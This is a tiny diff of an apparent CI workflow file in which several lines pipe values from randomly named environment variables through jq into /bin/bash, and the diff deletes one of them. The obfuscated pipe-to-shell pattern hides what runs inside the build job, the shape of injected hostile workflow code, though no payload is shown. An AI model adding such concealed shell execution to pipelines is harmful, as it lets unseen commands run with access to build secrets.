@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$wn9" | jq -r .jew7742 | /bin/bash
           echo $pgb9233 | jq -r .ar26499 | /bin/bash
           echo $ef830 | jq -r .ioake08 | /bin/bash
-          echo $bufoe280 | jq -r .jehf5583 | /bin/bash
           echo $sfwr7 | jq -r .jd93 | /bin/bash
 
       - name: Upload data
